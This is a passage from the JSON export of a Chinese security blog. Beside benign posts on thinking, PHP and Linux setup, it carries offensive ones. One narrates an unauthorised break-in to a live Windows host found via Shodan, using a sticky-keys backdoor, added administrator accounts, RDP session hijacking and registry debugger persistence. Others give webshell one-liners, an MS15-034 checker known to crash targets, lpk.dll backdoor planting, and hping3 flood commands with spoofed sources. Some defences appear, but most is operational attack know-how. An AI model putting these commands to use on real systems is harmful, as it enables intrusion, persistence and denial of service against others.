在一起」。并把这种感觉，跟身边的这个人建立「联结」。这告诉我们什么呢？很多时候，这种「联结」，只是大脑的一种理解，它不一定是真的。它可以减轻我们的认知成本，帮我们更好地思考，但很多时候，它也可能被人利用，成为我们思维的牢笼。稍微了解商业的朋友，都会知道，品牌的目的，是占领用户心智。如何占领用户心智？很简单，把品牌跟某些场景、感受捆绑起来，不断地向你重复，强化，直到让你产生固化的「联结」。去屑用什么？海飞丝。美白牙齿？黑人。过节送爸妈？脑白金。等等。一旦你建立了这种联结，你就会在场景触发的时候，下意识地联想到对应的品牌。你甚至不会怀疑这种联结的真实性，你会把它当做一个既定事实。但它们到底是不是事实呢？不知道。最经典的例子：钻戒。为什么钻戒能够跟爱情捆绑？同样几万块，一起去欧洲玩一圈，跟买一颗钻戒相比，前者就不能证明爱情吗？这些联结，是怎么来的？无非就是砸钱，请明星，买媒体，打广告，重复slogan，反反复复向你灌输。也就是说，一个品牌，只要肯花钱，买渠道，做宣传，不断地向你灌输一个联结，只要时间足够长、强度足够大，这个联结就会被「楔」进你的脑海中，成为潜移默化的事实。但在这个过程中，这个联结是不是合理？是不是事实？其实是无足轻重的。重点在于什么呢？在于受众触及，并建立了这个联结。一旦你默认这个联结，其实就是被洗脑了。所以，为什么商业社会，要不断地去推出和炒作一些概念？答案很简单：通过推出一些全新的概念，强行跟一些正面的观念建立联结，并通过大范围的宣传，不断地将它「打入」受众的脑海中。这样，就能达成自己想要的目的。比如「共享经济」。从Uber开始，到滴滴，再到摩拜、Ofo，都在宣称自己是「共享经济」。到后来，还出了各种共享充电宝、共享雨伞、共享睡眠……诸如此类。但事实上，真正意义上的共享经济，只有 Uber 和 Airbnb。它们开启了这套模式：让用户把自己的闲置资源借出来，通过平台，连接其他需要的人，实现资源的有效配置。它的本质是C2C。而滴滴，摩拜，Ofo，充电宝，全部是B2C —— 这跟「租赁」有什么区别？公共租赁单车，政府十年前就做了。摩拜和它们的区别，无非两个：第一是车子好了一些，第二是可以随处停放而已，本质上是一样的。为什么它们都要用「共享经济」包装自己？因为共享经济是一个热词。它跟什么东西绑定呢？全球化，前沿，科技，趋势，流行，资源流动……它会自然而然地，让我们联想到这些东西。而如果换成「租赁」，是不是格局一下子就小了很多？比起改变「租赁」在人们心中的联结，更简单的做法，显然是推出一个新的概念，建立联结，不断去包装和强化它。另一个典型例子是「IP」。这个概念，是三四年前炒起来的。很多人也许说不出它的全称，但一定知道它的意思。但这个概念是一个新事物吗？所谓的「IP衍生开发」，日本早在上个世纪就这样做了。一个漫画火了，出动画版，出剧场版，出同人，出玩具模型，出线下活动……一整条产业链，每个环节都赚得盆满钵满。它无非就是「内容资产」或者「品牌资产」。为什么大家要炒这个概念？因为，商业需要适时地推出一些概念，去引领潮流，去刺激受众，去重新包装，去提高含金量，去获取资本的青睐，去吸引普罗大众的注意力。这些不断被推出来的概念，刺激着我们的大脑，让我们在潜移默化之中，接受他们的设定。你以为你在独立思考，其实，你只是在重复着别人的语言。那么，如何才能避免落入思维牢笼呢？唯一的方法，是拒绝下意识、直觉性的反应。退一步，对自己的思维进行审视，再做决策。不动脑子、相信既定「联结」，是最省力的做法，是大脑最喜欢的做法，也是整个商业社会和娱乐形态，最希望的做法。不要让他们如愿。有时候，不妨舍近求远，选择困难一点的路径。丰田有一个经典的「5 Why」分析法，其实，就是对问题进行反复多次的发问，来打破固有的预设，找到背后真正的根源。很多人不喜欢这样做。他们往往只问一次、两次，然后就止步不前了。对他们来说，这些东西是不言自明的，是「常识」，无需操心的。但是，我会建议你，多走两步。为什么是这样的？这个前提正确吗？如果假设不正确，会怎么样？重点不在于找到答案，而在于发问和怀疑的过程。在这个过程中，你会对自己的「联结」重新进行审视，你会发现深藏在自己心底的偏见，你会发现，许多表面看似简单的事情背后，其实都有着复杂的原因。你会慢慢发现，你走得比别人更远，看到的事物也更深入。这就是深度思考。真理永远不在某一个地点，真理是在路上。","categories":[{"name":"文章","slug":"文章","permalink":"https://mochazz.github.io/categories/文章/"}],"tags":[{"name":"思考认知","slug":"思考认知","permalink":"https://mochazz.github.io/tags/思考认知/"}]},{"title":"一次渗透实战记录","slug":"pentest1","date":"2017-09-07T04:00:00.000Z","updated":"2017-09-10T02:07:30.372Z","comments":true,"path":"2017/09/07/pentest1/","link":"","permalink":"https://mochazz.github.io/2017/09/07/pentest1/","excerpt":"","text":"0X00前言前几天在看某个安全会议的PPT，发现里面提了一个漏洞我不怎么了解，但是很有趣，于是就打算通过shodan复现一下。这个漏洞需要对方是windows主机且开启了3389，结果试了一波，没有一台成功，估计是漏洞比较老吧(14年的)。好不容易找到一台开了3389的目标，结果没复现成功，但是通过思考分析还是打开了通往主机的大门。 0X01实战过程记录首先我原本复现的漏洞，是早些时候网络上的黑阔用来日另外一批黑阔的肉鸡控制器所用的，就是所谓的黑吃黑。我找了一台开了3389的目标机器，通过网络上公布的漏洞细节进行复现，结果发现不行，应该是修复了，或者是我的姿势不对。但是我并没有打算放弃，我想：既然这服务器是用来管理肉鸡的，黑客们必定在上面留了许多后门，于是我就想到了shift后门，之前我也有做过笔记，如果你不了解可以点这里。于是，我就按了5下shift键，然后cmd就奇迹般的出现了，运气真好。通过shift调用出的cmd是system权限，我们来查看一下上面有哪些用户，并添加账户，命令执行后会返回一串意大利文，google翻译一下当然，如果你添加账户的密码设置的太简单，会显示命令执行失败。当我们添加完账户后，将账户添加进administrators组。查看是否我们成功将用户添加进administrators管理组尝试登录，会发现出现如下错误我想可能是我们没有将用户添加到远程桌面管理组里，使用net localgroup看一下总共有哪些用户组，因为这台主机的语言使用的是意大利语言，所以远程桌面管理组可能不是我们平常所见到的Remote Desktop Users。大概意思就是”发生系统错误 1312。指定的登录会话不存在。可能已被终止。没关系，既然net localgroup命令用不了，我们可以直接查看一下administrator所在的用户组，因为administrator允许远程登录。我们使用net user administrator命令来查看administrator所在的用户组。使用net localgroup “Utenti desktop remoto” 用户名 /add命令即可将用户添加到远程桌面管理组，之后就能顺利进入主机。 0X02另类思路其实本来到这里已经结束了。但是在没拿下之前，我让表哥试试能不能拿下，后来我们几乎在同一时间拿下。但是，表哥是通过远程桌面会话劫持（RDP hijacking ）来进入主机的。我去，这是啥骚操作，赶紧google一下，发现这篇文章写的不错RDP hijacking(有墙)。大家都知道，在windows中如果你知道另一个已登录用户的密码，就可以通过认证后切换成该用户。test成功切换成administrator用户劫持方法一：创建服务实际测试截图这里有个演示视频(墙)：All Windows TS Session Hijacking (2012 R2 Demo)劫持方法二：直接利用query和tscon命令来看一下query命令用法tscon命令用法下面结合query和tscon命令达到会话劫持目的query user查询所有已登录的用户会话信息tscon 会话ID切换到目标会话状态回车之后可直接切换成目标用户登录系统。 0X03留木马后门第一种方法：替换粘滞键程序这个我之前刚好有分析实践过，也写过防护方案，具体看这篇：通过shift快捷键运行后门第二种方法：替换讲述人程序根据老外的文章，把讲述人程序替换cmd.exe也是可以的，然而我测试时失败了。老外还给出了直接修改注册表项的命令，然而我两个试了都不管用(win03上测试的)，这里还是贴出来吧，谁要是知道告诉我一下。将sethc.exe替换成cmd.exe REG ADD &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /t REG_SZ /v Debugger /d “C:\\windows\\system32\\cmd.exe” /f 将utilman.exe替换成cmd.exe REG ADD &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe&quot; /t REG_SZ /v Debugger /d “C:\\windows\\system32\\cmd.exe” /f 0X04防御方案监控系统进程活动，开启日志记录，当有新；禁止使用sethc.exe和utilman.exe快捷键使用；异常服务创建和异常计划任务创建是应有日志记录；通过组策略来限制sethc.exe和utilman.exe所有者的访问执行权限；不要将开启RDP(Remote Desktop Protocol)/RDS(Relational Database Service)服务的主机暴露在公网上； 0X05总结这次的的渗透经历，总的来说还是学到不少，突破点就是利用前人种的马。所以说思路很重要，还是要多多看其他人的文章。另外，英语还是挺重要的，有的东西可以多看看外文。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://mochazz.github.io/categories/渗透测试/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://mochazz.github.io/tags/windows/"}]},{"title":"Win2003搭建shadowsocks服务端","slug":"win03_ss","date":"2017-09-05T03:25:00.000Z","updated":"2017-09-07T01:42:54.955Z","comments":true,"path":"2017/09/05/win03_ss/","link":"","permalink":"https://mochazz.github.io/2017/09/05/win03_ss/","excerpt":"","text":"0X00前言本来打算在一台肉鸡上装shadowsocks的，结果无法在肉鸡上监听外网地址的端口，估计是做了内网到外网的端口映射，我在本地虚拟机上搭建成功，所以还是做个笔记。 0X01搭建ss过程装上python2.7.13装上Node.js v0.11.0windows2003双击安装最新版的nodejs会没反应，所以安装旧版即可。打开cmd，输入npm install -g shadowsocks安装ss装好之后进入C:\\Documents and Settings\\Administrator\\Application Data\\npm\\node_modules\\shadowsocks目录，找到config.json并如下编辑在cmd中运行ssserver命令即可客户端配置如下客户端浏览器设置代理，成功访问freebuf 0X02总结没有总结了","categories":[{"name":"ss搭建","slug":"ss搭建","permalink":"https://mochazz.github.io/categories/ss搭建/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://mochazz.github.io/tags/windows/"}]},{"title":"echo写马技巧","slug":"echo","date":"2017-08-26T15:41:00.000Z","updated":"2017-09-07T01:44:42.065Z","comments":true,"path":"2017/08/26/echo/","link":"","permalink":"https://mochazz.github.io/2017/08/26/echo/","excerpt":"","text":"windows下echo写马错误写马方式 echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; C:\\Users\\Mochazz\\Desktop\\test.asp 正确写马方式 echo ^&lt;%eval request(cmd)%^&gt; &gt; C:\\Users\\Mochazz\\Desktop\\test.asp Linux下echo写马echo “&lt;?php @eval($_POST[&apos;cmd&apos;]); ?&gt;” &gt; cmd.php 参考：sa权限获取webshell思路","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://mochazz.github.io/categories/渗透测试/"}],"tags":[{"name":"木马","slug":"木马","permalink":"https://mochazz.github.io/tags/木马/"}]},{"title":"可移动的linux系统","slug":"linux_on_udisk","date":"2017-08-19T04:18:00.000Z","updated":"2017-09-07T01:42:26.847Z","comments":true,"path":"2017/08/19/linux_on_udisk/","link":"","permalink":"https://mochazz.github.io/2017/08/19/linux_on_udisk/","excerpt":"","text":"准备工具unetbootindeepin-15.4.1-amd64.iso还需要两个U盘，一个用来做启动盘，另一个用来装我们的linux系统 制作linux启动盘这里提供两种安装方式，选择使用已经下载好的iso文件来安装一切就绪后选择退出，重启系统 安装linux系统到U盘选择通过U盘启动，进入安装deepin安装完成，成功进入deepin linux系统，以后就可以通过U盘直接进入linux系统了 后记问题一刚开始制作启动盘时，突然发现我windows10的电脑显示已经连接U盘，但是盘符不见了，也就无法进入U盘，一脸懵逼，前一阵子还用的好好的。解决方法如下找到你的U盘，右键选择删除设备后，再重新拔插U盘，即可看到盘符 问题二安装完deepin linux后，发现无线信号超级差，可以说根本无法上网，除非插网线。这个问题其实是我的网卡(rtl8723be)对linux系统支持不好造成的，之前也解决过，这里做个记录 安装网卡驱动git clone https://github.com/lwfinger/rtlwifi_newcd rtlwifi_newmake installmodprobe rtl8723be 编辑/etc/modprobe.d/rtl8723be.conf文件，添加如下语句options rtl8723be ant_sel=2options rtl8723be ips=0options rtl8723be fwlps=0options rtl8723be swenc=1之后重启系统即可解决","categories":[{"name":"linux","slug":"linux","permalink":"https://mochazz.github.io/categories/linux/"}],"tags":[{"name":"安装linux系统","slug":"安装linux系统","permalink":"https://mochazz.github.io/tags/安装linux系统/"}]},{"title":"MS15-034","slug":"ms15-034","date":"2017-08-16T13:14:00.000Z","updated":"2017-09-07T01:42:12.231Z","comments":true,"path":"2017/08/16/ms15-034/","link":"","permalink":"https://mochazz.github.io/2017/08/16/ms15-034/","excerpt":"","text":"前言前一阵子在对某网站进行漏洞扫描时，发现存在MS15-034远程代码执行漏洞。这是一个位于HTTP.SYS中的整数溢出漏洞。UlpParseRange处发生了整数溢出，而在此处导致了安全检查的绕过。具体的分析，还是看360的这篇分析吧。 漏洞利用通过给IIS服务器发送如下格式的HTTP请求，就可以触发（检测）这个漏洞 GET / HTTP/1.1 Host: stuff Range: bytes=0-18446744073709551615 检测脚本#!/usr/bin/env python # -*- coding: utf-8 -*- #The IIS Vul （CVE-2015-1635，MS15-034）Check Script. #HTTP.sys Remote Code Execute. ############################################### # example: python ms15-034.py www.example.com # ############################################### import sys import requests def Check_CVE_2015_1635(Ip_Str): if Ip_Str: Server_Tag = [&apos;Microsoft-HTTP&apos;,&apos;Microsoft-IIS&apos;] Tmp_Req_Url = str(&apos;&apos;.join([&apos;http://&apos;,Ip_Str])) Request_Tmp = requests.get(Tmp_Req_Url) remote_server = Request_Tmp.headers[ &apos;server&apos;] if (tmp_tag in remote_server for tmp_tag in Server_Tag): print(&quot;[+] Web Service Is &quot; + remote_server) MS15_034_Execute(Tmp_Req_Url) else: print(&quot;[+] Web Service Is Not IIS\\n[+] May Be &quot; + remote_server) def MS15_034_Execute(domain): print(&quot;[+] Start Checking...&quot;) Req_headers = {&apos;Host&apos;: &apos;stuff&apos;,&apos;Range&apos;: &apos;bytes=0-18446744073709551615&apos;} Request = requests.get(domain, headers=Req_headers) if &apos;Requested Range Not Satisfiable&apos; in Request.content: print(&quot;[+] The HTTP.sys remote code execution vulnerability Is Exists!&quot;) elif &apos;The request has an invalid header name&apos; in Request.content: print(&quot;[+] The vulnerability has been fixed!&quot;) else: print(&quot;[+] The IIS service was unable to display the vulnerability exists, the need for manual testing!&quot;) def main(): ip_Str = sys.argv[1] Check_CVE_2015_1635(ip_Str) if __name__ == &apos;__main__&apos;: main() 测试结果这个验证脚本在验证时，会导致系统蓝屏，测试时请谨慎使用。相关文章：MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞分析Microsoft Security Bulletin MS15-034 - Critical Vulnerability in HTTP.sys Could Allow Remote Code Execution","categories":[{"name":"服务安全","slug":"服务安全","permalink":"https://mochazz.github.io/categories/服务安全/"}],"tags":[{"name":"ms15-034","slug":"ms15-034","permalink":"https://mochazz.github.io/tags/ms15-034/"}]},{"title":"PHP之面向对象","slug":"php(5)","date":"2017-08-13T08:31:00.000Z","updated":"2017-09-07T01:41:39.359Z","comments":true,"path":"2017/08/13/php(5)/","link":"","permalink":"https://mochazz.github.io/2017/08/13/php(5)/","excerpt":"","text":"类使用class关键字创建一个类，变量叫属性，函数叫方法。使用new关键字实例化一个对象 类成员的访问控制Public：可以在任何地方被访问Protected：可被其所在的类的子类和父类访问Private：只能在类内部被访问，子类不能访问父类的私有属性如未声明，默认为public 常量使用const定义类常量使用this关键字在类内部访问成员变量和方法 构造函数和析构函数构造函数在使用new关键字创建对象时自动执行，可传入参数；析构函数在对象被销毁时自动执行，不能有参数。 clone一个对象clone将原对象的所有信息从内存中赋复制一份，存储在新开辟的内存中。 继承PHP中使用extends继承一个类，不存在多继承，一个类只能继承一个父类。 parent::关键字使用parent::关键字访问父类 魔术方法__clone()方法__clone方法会重写clone，当使用clone时，不仅会复制变量，还会执行__clone里面的代码 __toString() __autoload()__autoload()方法会在第一次引用一个类时调用该方法，可以通过定义这个函数来启用类的自动加载 __set()和__get()用于处理类内未定义的属性或者处理私有属性 __call()用于处理类内未定义的方法，第一个参数为方法名，第二个参数为方法的参数；还可用于不同方法名但功能相同的方法。 __invoke()和__callStatic() 序列化 json数据json_decode(string,bool)当第二个参数为true时，返回一个数组，默认为false返回一个对象。 抽象类使用关键字abstract来声明一个抽象类以及抽象方法。抽象类不能实例化对象，子类继承抽象父类后，子类中必须有父类中的抽象方法。抽象类起到规定子类结构的作用，子类必须给出父类抽象方法的实现。 接口接口是一种特殊的抽象类，使用关键字interface来声明一个接口，不能实例化对象。接口中的方法必须全是抽象方法成员属性必须是常量。所有的权限必须是public，由子类来拓展。使用implements代替extends来实现接口，一个类只能继承一个父类，但是可实现多个接口。如果一个类同时使用了继承父类和实现接口，必须先继承再实现。 多态 文件上传上传文件后，可以看到数组_FILES中添加了一个以file控件的name值为键，Lighthouse.jpg的详细信息为值。","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://mochazz.github.io/categories/编程语言/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://mochazz.github.io/tags/PHP/"}]},{"title":"PHP之函数","slug":"php(4)","date":"2017-08-03T08:43:00.000Z","updated":"2017-09-07T01:41:32.618Z","comments":true,"path":"2017/08/03/php(4)/","link":"","permalink":"https://mochazz.github.io/2017/08/03/php(4)/","excerpt":"","text":"func_get_args和func_num_args 按值传参 引用传参 默认参数 局部变量函数中的变量无特殊声明，则为动态地分配存储空间，在函数调用后将自动释放。 静态变量使用static关键字声明，可确保变量的内存地址不变。只有在函数第一次执行时会调用执行static语句，之后调用函数将不再执行。 全局变量使用global声明变量，是全局变量的一个引用，也可以使用$GLOBALS[“var”] = “test”;来声明。 global与$GLOBALS区别PHP中可以先调用函数，再定义该函数，只不过会有警告，可以用error_reporting(0);屏蔽。用变量存储函数名 文件包含 include和require的区别如果要通过文件包含来加载一个函数，在调用函数之前必须先包含该文件，不能先使用在包含，所以一般包含语句都写在PHP程序开头。PHP不支持函数重载，也就不允许重复包含同一个文件，所以使用include_once()或require_once()可以避免该问题 PHP模板化","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://mochazz.github.io/categories/编程语言/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://mochazz.github.io/tags/PHP/"}]},{"title":"PHP之数组与文件","slug":"php(3)","date":"2017-08-01T02:00:00.000Z","updated":"2017-09-07T01:41:25.621Z","comments":true,"path":"2017/08/01/php(3)/","link":"","permalink":"https://mochazz.github.io/2017/08/01/php(3)/","excerpt":"","text":"数组数组操作符使用+操作符号时，如果两个数组有相同的键，将不会添加。 访问数组 数组的创建与添加数组元素的添加和删除implode()、explode()数组与字符串互转 in_array()判断键是否在数组中array_merge()合并数组 array_combine() extrace()将数组转换成标量变量 array_keys()和array_values() 文件操作使用fopen()函数打开文件，它支持绝对路径和相对路径打开文件时有以下三种选择 使用fclose()函数关闭该指针指向的文件 使用fread()、filesize()读取文件大小及内容 fpassthru()函数 fgets()和fgetss()函数fgets()函数读取到第一个换行字符(\\n)或文件结束符(EOF)，或自定义长度-1 fwrite()函数 文件处理函数file_get_contents和file_put_contents 其他文件处理函数 fread()函数 文件锁flock()","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://mochazz.github.io/categories/编程语言/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://mochazz.github.io/tags/PHP/"}]},{"title":"php之字符串和正则匹配","slug":"php(2)","date":"2017-08-01T01:12:00.000Z","updated":"2017-09-07T01:41:19.152Z","comments":true,"path":"2017/08/01/php(2)/","link":"","permalink":"https://mochazz.github.io/2017/08/01/php(2)/","excerpt":"","text":"字符串单引号变量和转义的序列都不会进行转义，而会原样输出。 双引号PHP会处理双引号括起来的字符串、变量以及转义序列 标识符(定界符)需要输出大量文本时，可以使用标识符来定义字符串。 字符串拼接 格式化字符串 获取字符串 字符串查找 字符串替换 正则匹配(1)^PHP 匹配以PHP开头的字符串 [^a-z] 表示匹配所有非小写字母开头的字符串2PHP$ 匹配以PHP结尾的字符串(3)^PHP$ 精确匹配PHP字符串(4)PHP 匹配所有含有PHP的字符串(5)com|org|net 匹配com、org、net中的任意一个(6)PHP内置通用字符集(7)使用{}确定重复出现的次数(8)?与{0,1}相等(9)*与{0,}相等(10)+与{1,}相等 正则匹配函数int ereg ( string $pattern , string $string [, array &amp;$regs ] ) ereg(匹配规则，要匹配的字符串，匹配结果存放数组) 该函数会将匹配中的子串存在regs数组中，regs[0]为原字符串，regs[1]为第一个匹配中的字符串，regs[2]为第二个匹配中的字符串。如果省略第三个参数，则匹配中返回true;否则返回false。php5.3以上的版本不支持ereg()函数，而是使用preg_match()函数。array split ( string $pattern , string $string [, int $limit = -1 ] )array explode ( string $delimiter , string $string [, int $limit = PHP_INT_MAX ] )explode(一个分割用的字符或字符串，原始字符串，最多分割成多少个子串)","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://mochazz.github.io/categories/编程语言/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://mochazz.github.io/tags/PHP/"}]},{"title":"PHP之基础入门","slug":"php(1)","date":"2017-07-30T09:00:00.000Z","updated":"2017-09-07T01:41:11.399Z","comments":true,"path":"2017/07/30/php(1)/","link":"","permalink":"https://mochazz.github.io/2017/07/30/php(1)/","excerpt":"","text":"PHP四种不同的标记风格&lt;?php 代码 ?&gt; 官方推荐风格 &lt;? 代码 ?&gt; 短标记风格，需配置文件php.ini中开启short+open_tag &lt;% 代码 %&gt; ASP风格，需配置文件php.ini中开启asp_tags &lt;script language=”php”&gt; 代码 &lt;/script&gt; JavaScript标记的风格，这种风格在任何情况下都可以使用。 注释单行注释C++风格单行注释 //这是单行注释 Shell风格单行注释 #这是单行注释 多行注释/* *这是多行注释 */ 变量声明 引用赋值使用引用赋值时，两个变量将会指向内存中的同一个存储空间，任何一个变量发生变化都会引起另一个变量的变化。 变量可变变量这种写法不推荐在项目开发中使用，因为代码可读性差，但是以前却可以用来写过狗一句话 全局变量在关键字前加global 超全局变量组 常量自定义常量boolean define(string name,mixed value[, bool case_insensitive])当case_insensitive为true时，常量名不区分大小写 魔术常量PHP为弱类型语言，变量类型由数据决定 字符串单引号变量和转义的序列都不会进行转义 双引号PHP会处理双引号括起来的字符串、变量以及转义序列 数组由键值对组成，键可以是数字，也可以是字符串sort按数值从小到大排序，键变成顺序索引，按数字、ASCII字符、中文字符排序。rsort按数值从大到小排序，键变成顺序索引。ksort按键从小到大排序，键在原来的基础上发生变化。asort按数值从小到大排序，键在原来的基础上发生变化。 类型转换隐式强制类型转换不同类型进行数值比较 显式强制类型转换 强制类型转换函数","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://mochazz.github.io/categories/编程语言/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://mochazz.github.io/tags/PHP/"}]},{"title":"通过shift快捷键运行后门","slug":"shift","date":"2017-07-28T16:30:00.000Z","updated":"2017-09-07T01:28:23.834Z","comments":true,"path":"2017/07/29/shift/","link":"","permalink":"https://mochazz.github.io/2017/07/29/shift/","excerpt":"","text":"简介我们都知道，windows系统按5下shift后，windows就执行了system32下的sethc.exe，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。 偷天换日将我们的cmd.exe或者木马后门名字改成sethc.exe，然后替换C:windows\\system32\\sethc.exe程序按5下shift键可以调出cmd命令窗口，还可以添加账户：这里因为我添加的账户名称后面有一个$符号，使用net user查看是看不到的，我们可以试着登录系统看看是否添加成功：如果你登录不了的话，你可能需要先把用户添加到administrators组里：1net localgroup administrators admin$ /add Lpk后门添加一般系统都存在lpk.dll文件，该文件位于C:\\WINDOWS\\system32和C:WINDOWS\\system\\dllcache目录下。当exe文件运行时，lpk.dll就会被Windows动态链接，系统会先从当前目录查找，然后在到系统目录查找并加载。下面使用工具生成木马并保存为lpk.dll。我们要做的就是替换系统的lpk.dll文件。将这个文件替换系统自带的文件，并按5次shift键，系统就会运行sethc.exe程序，进而lpk.dll就会被Windows动态链接，同时按下我们设置的键(我设置的是65和83，即一起按下AS键)输入我们设置的密码，最终弹出我们的shell窗口，添加账号后即可登录。 修复方案方案一：删除sethc.exe程序所有用户运行权限接下来就无法使用粘滞键快捷键了，另外提醒一下，直接删除sethc.exe是没用的，系统还会自动找回。方法二：添加一个everyone用户组，然后权限选择拒绝所有方案三：禁用shift快捷键方案四：针对lpk后门，现在的防护软件基本可以查杀","categories":[{"name":"Windows","slug":"Windows","permalink":"https://mochazz.github.io/categories/Windows/"}],"tags":[{"name":"后门","slug":"后门","permalink":"https://mochazz.github.io/tags/后门/"}]},{"title":"windows10安装linux子系统","slug":"linux_subsystem","date":"2017-07-27T09:10:00.000Z","updated":"2017-09-07T01:28:07.718Z","comments":true,"path":"2017/07/27/linux_subsystem/","link":"","permalink":"https://mochazz.github.io/2017/07/27/linux_subsystem/","excerpt":"","text":"安装linux子系统在设置里面选择更新和安全勾选开发人员模式在控制面板的程序和功能，点击启用或关闭windows功能，勾上适用于linux的windows子系统接着重启就好打开cmd输入bash回车输入y即可开始安装 错误解决当然，在这里有个坑，我下了好久，一直出现0x80072ee2下载错误的问题。出现 0x80072ee2的错误代码是由于服务器无响应造成的，我们可以更改DNS地址接下来下载就快很多了，10分钟不到就下载好了通过bash安装的是Ubuntu 16.04.2 LTS 设置自己的Bash banner下载好后总要搞点事情，没办法，就是爱折腾在/etc/bash.bashrc文件的最后一行添加linux_logo -f -L 30 &amp;&amp; figlet -ct Mohcazz，当然使用这两条命令的前提是安装了linuxlogo和figlet这样以后每次从cmd进入bash就会出现如下界面 安装metasploit换上kali更新源，自己用vi命令改一下吧添加kali源后直接更新会遇到如下问题：添加kali key后就能正常更新了 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv ED444FF07D8D0BF6 Executing: /tmp/tmp.A0UNJSF9eW/gpg.1.sh --keyserver 成功进入metasploit： 开启图形化界面下载安装Xming X Server for Windows，安装之后运行其中的Xlaunch，界面如图：编辑.bashrc文件sudo vi ~/.bashrc在文件末尾添加export DISPLAY=:1.0或者直接使用echo “export DISPLAY=:1.0” &gt;&gt; ~/.bashrc命令安装xfce4终端sudo apt install xfce4-terminal打开firefox浏览器sudo firefoxsudo xfce4-session 后记使用nmap的时候发现会出现如下问题经过一番查阅资料，发现这是一个未修复的坑，反正所有和网卡或socket有关的命令可能都不能用，有待开发人员解决。不过在windows运行linux已经算是一重大突破，所以还是静候佳音吧。其他Tips","categories":[{"name":"Windows","slug":"Windows","permalink":"https://mochazz.github.io/categories/Windows/"}],"tags":[{"name":"linux子系统","slug":"linux子系统","permalink":"https://mochazz.github.io/tags/linux子系统/"}]},{"title":"使用hexo+github部署自己的博客","slug":"hexo-build","date":"2017-07-26T08:00:00.000Z","updated":"2017-09-07T01:29:23.447Z","comments":true,"path":"2017/07/26/hexo-build/","link":"","permalink":"https://mochazz.github.io/2017/07/26/hexo-build/","excerpt":"","text":"开启github pages先注册一个github账号然后先登录你之前注册账号时用的邮箱，认证之后，选择新建仓库找到settings，往下拉到GitHub Pages这样，我们的blog首页就做好了Hexo主题链接 安装git 安装nodejs这里没有什么好说明的，直接默认下一步安装就好。 安装hexo创建一个用于存放hexo组件的目录，我这里创建一个blog目录为例，进入创建好的blogs目录，右键选择git bash here使用npm安装hexo客户端：npm install hexo-cli -g下载好hexo后，初始化：hexo init使用hexo -v查看所安装的hexo版本，使用hexo h查看帮助文档：打开本地博客根目录下的 _config.yml 文件，最下面找到 Deployment使用hexo s在本地4000端口开启服务，浏览器访问http://127.0.0.1:4000即可看到我们的博客首页：这样就算搭建成功，如果需要发布自己的博文，需要先用markdown语法来写你的博文并保存成.md格式文件，然后放到blogs\\source_posts目录下。本地查看博文效果使用hexo s，要部署到到github page上的话使用hexo g &amp;&amp; hexo d然后根据提示输入你的github账号密码即可。下面这是我的博文：Markdown语法大致这样： 遇到的错误错误一：找不到git解决方法：npm install hexo-deployer-git –save错误二：无法自动检测邮箱解决方法：设置一下邮箱就好，邮箱必须是你注册github时绑定的那个邮箱git config –global user.email “youmail@163.com”接下来就可以正常将你的博客部署到github上了。了解hexo各个参数更详细的使用方法","categories":[{"name":"博客搭建","slug":"博客搭建","permalink":"https://mochazz.github.io/categories/博客搭建/"}],"tags":[{"name":"windows安装hexo","slug":"windows安装hexo","permalink":"https://mochazz.github.io/tags/windows安装hexo/"}]},{"title":"hping3使用","slug":"hping3","date":"2017-07-23T14:00:00.000Z","updated":"2017-09-07T01:27:33.687Z","comments":true,"path":"2017/07/23/hping3/","link":"","permalink":"https://mochazz.github.io/2017/07/23/hping3/","excerpt":"","text":"简介hping3是一款免费的数据包生成器和分析器。可用于安全审计、防火墙规则测试、网络测试、端口扫描、性能测试，压力测试(DOS)，几乎可以发送任意类型的TCP/IP数据包。功能强大但是每次只能向一个IP地址发送数据包，还能够在两个相互包含的通道之间传送文件。 ICMP测试hping3 -1 192.168.100.105（类似于ping 192.168.100.105） 数据包跟踪hping3 –traceroute -V -1 www.baidu.com（类似于traceroute www.baidu.com） 端口扫描单端口扫描hping3 -I eth0 -p 22 -c 1 -S 192.168.100.104hping3 -I eth0 -p 1 -c 1 -S 192.168.100.104 多端口扫描hping3 -8 1-1024 192.168.100.102 文件传输发送端：hping3 -2 -p 1373 192.168.100.102 -d 100 -E test.txt-2 UDP模式 -p端口-d 数据大小 -E 文件名接收端：nc -lp 1373 -u -w 5 &gt; recv.txt &amp;&amp; cat recv.txt-l 监听模式 -p 端口-w 超时时间 -u UDP模式 主机发现虽然hping3一次只能扫描一个IP，但是我们可以结合shell脚本语言完成整个网段的扫描。下面使用for循环来实现：for addr in $(seq 1 254);do hping3 192.168.1.$addr -c 1 –icmp &amp; donefor addr in $(seq 1 254);do hping3 192.168.1.$addr -c 1 –icmp &gt;&gt; result2.txt &amp; donecat result2.txt | grep ^len(通过该命令实现查看存活主机功能，^len表示以len开头的行) DOS攻击Syn Flood攻击hping3 -c 1000 -d 120 -S -p 80 –flood –rand-source 192.168.100.1-c 指定连接数 -p 目标端口-d 指定数据部分的大小 -S 攻击类型是Syn flood–flood 以泛洪的方式攻击 –rand-source 随机产生伪造源地址hping3 -S -P -U -p 80 –flood –rand-source 192.168.100.1-P flag置为Push -U flag置为Urge紧急加这两参数可以提高效率 TCP Flood攻击使用以下命令建立全连接：hping3 -SARUPF -p 80 –flood –rand-source 192.168.100.1 ICMP Flood攻击hping3 -q -n -d 200 –icmp –flood -a 11.11.11.11 192.168.100.1-q安静模式 -n不解析域名 -a指定伪造IP UDP Flood 